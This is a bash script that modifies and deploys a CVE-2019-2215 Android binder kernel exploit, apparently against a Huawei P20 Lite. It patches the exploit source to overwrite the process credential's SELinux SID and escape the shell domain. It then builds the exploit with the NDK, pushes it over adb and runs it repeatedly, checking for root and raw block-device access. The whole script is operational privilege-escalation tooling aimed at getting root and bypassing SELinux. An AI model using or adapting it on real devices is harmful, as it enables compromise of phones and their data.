#!/bin/bash
# Minimal edit: swap the AV-cache overwrite for the cred-SID write.
#
# The exploit ships a set_sid(cred, sid) helper that nothing calls, and an
# overwrite_avc_cache(addr, sid) call whose address constant is wrong for this
# kernel. Both take two arguments, so replacing one call with the other keeps the
# binary's shape nearly identical - and constants-only edits have been the only
# changes that still win the race (measured: pristine + constants wins, anything
# with added code or an argv sweep loses).
#
# If it works we get out of the shell SELinux domain without needing any kernel
# symbol for this build, which is exactly the blocker after the 5% wall made the
# downgrade route unavailable.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)

echo "############ 1. pristine sources, compiled DELAY=25"
git checkout -- exploit/cve_2019_2215.c exploit/include/kernel_specific.h
python3 - <<'PY'
import re
p = '/home/placeless/dev/p20lite-cve/exploit/include/cve_2019_2215.h'
s = open(p).read()
open(p, 'w').write(re.sub(r'#define DELAY \d+u', '#define DELAY 25u', s))
PY
grep -nE "^#define DELAY" exploit/include/cve_2019_2215.h

echo
echo "############ 2. swap the call"
python3 - <<'PY'
p = '/home/placeless/dev/p20lite-cve/exploit/cve_2019_2215.c'
s = open(p).read()
old = "    overwrite_avc_cache(avc_cache_addr, sid);\n"
new = "    set_sid(cred_addr, 1);\n"
assert old in s, "call site not found"
s = s.replace(old, new, 1)
open(p, 'w').write(s)
print("swapped overwrite_avc_cache(...) -> set_sid(cred_addr, 1)")
PY
grep -n "set_sid(cred_addr" exploit/cve_2019_2215.c

echo
echo "############ 3. build and push"
"${NDK}ndk-build" -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -2
ls -la libs/arm64-v8a/cve-2019-2215
timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

echo
echo "############ 4. run and see whether the domain moves"
for i in 1 2 3; do
  echo "--- attempt $i"
  printf 'id\ncat /proc/self/attr/current\ngetenforce\ndd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1\n' \
    | timeout 120 adb shell /data/local/tmp/cve-2019-2215 > "/tmp/sidcall_$i.out" 2>&1
  OUT=$(tr -d '\000' < "/tmp/sidcall_$i.out")
  echo "    root: $(echo "$OUT" | grep -ac 'uid=0(root)')"
  echo "    ctx:  $(echo "$OUT" | grep -a 'context=' | tail -1 | cut -c1-60)"
  echo "    dd:   $(echo "$OUT" | grep -aE 'Permission|records' | tail -1)"
  if echo "$OUT" | grep -aq "uid=0(root)" && ! echo "$OUT" | grep -aq "denied"; then
    echo "    >>>>>> DOMAIN MOVED - BLOCK ACCESS GRANTED <<<<<<"
    echo "$OUT" | tail -10
    exit 0
  fi
  sleep 3
done
echo
echo "### last output:"; tr -d '\000' < /tmp/sidcall_3.out | tail -8
